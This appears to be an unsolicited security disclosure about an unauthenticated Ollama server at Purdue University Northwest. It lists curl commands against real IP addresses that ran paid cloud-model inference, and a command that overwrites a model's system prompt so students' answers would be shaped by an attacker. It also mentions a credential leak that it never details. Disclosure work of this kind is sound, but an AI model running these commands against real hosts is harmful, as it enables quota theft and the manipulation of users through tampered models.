I'm an independent security researcher. I hold CISA disclosures CVE-2025-4364 and ICSA-25-140-11 and conduct good-faith AI infrastructure research under the  umbrella. This is an unsolicited disclosure, no engagement exists with your organization, and I have not accessed, modified, or exfiltrated any data beyond what was necessary to confirm the exposure.

## Summary

Purdue University Northwest server running 5 Ollama models, 4 of which are cloud proxy subscriptions. Three cloud proxies confirmed live (200 OK), inference executes at operator expense without any authentication. Also includes `sorc/qwen3.5-claude-4.6-opus:9b`, a community model distilled from Claude 4.6 Opus output.

## Findings

### F1: Three Cloud Proxy Subscriptions Live (CRITICAL)

Three cloud proxy models returned **200 OK** without authentication:

```bash
# qwen3-coder-next:cloud - 4 tokens at operator expense
curl http://163.245.217.165:11434/api/generate \
  -d '{"model":"qwen3-coder-next:cloud","prompt":"say: Purdue","stream":false}'
# → 200 OK, "Purdue", eval_count: 4

# gemma4:31b-cloud - 2 tokens at operator expense
curl http://163.245.217.165:11434/api/generate \
  -d '{"model":"gemma4:31b-cloud","prompt":"say: test","stream":false}'
# → 200 OK, "test", eval_count: 2

# gpt-oss:20b-cloud - 61 tokens at operator expense
curl http://163.245.217.165:11434/api/generate \
  -d '{"model":"gpt-oss:20b-cloud","prompt":"say: test","stream":false}'
# → 200 OK, eval_count: 61
```

All three subscriptions accessible to any internet actor without credentials. `gpt-oss:20b-cloud` (OpenAI's open-source GPT) generated 61 tokens on a single-word prompt, aggressive quota exposure.

### F2: Cloud Proxy Model Injection (CRITICAL)

Any actor can overwrite system prompts on cloud proxy models via CVE-2025-63389:

```bash
curl -X POST http://163.245.217.165:11434/api/create \
  -d '{"model":"qwen3-coder-next:cloud","from":"qwen3-coder-next:cloud","system":"[attacker prompt]"}'
```

All students/staff accessing these models through the Open WebUI frontend (163.245.208.42:3000) would receive responses shaped by the injected prompt.

### F3: Open WebUI Auth Bypass (HIGH)

Open WebUI at 163.245.208.42:3000 (auth=True) does not protect the Ollama backend at 163.245.217.165:11434. The Ollama and Open WebUI instances are on different IPs in the same subnet, with the raw Ollama port exposed.

**Why it matters**

Any internet actor can run inference against your cloud API subscription at your expense, this constitutes direct quota/billing theft. The credential leak (username + SSH public key) exposes your service account to enumeration and credential-stuffing against other services.

**One-line fix**

```
OLLAMA_HOST=127.0.0.1:11434
systemctl restart ollama
```

This rebinds Ollama to loopback only. If running in Docker: `docker run -p 127.0.0.1:11434:11434 ollama/ollama`.

**CVE-2025-63389**

All models on this instance are injectable via the unauthenticated `/api/create` endpoint, an attacker can overwrite any model's system prompt or delete models entirely. No patch exists as of this disclosure.
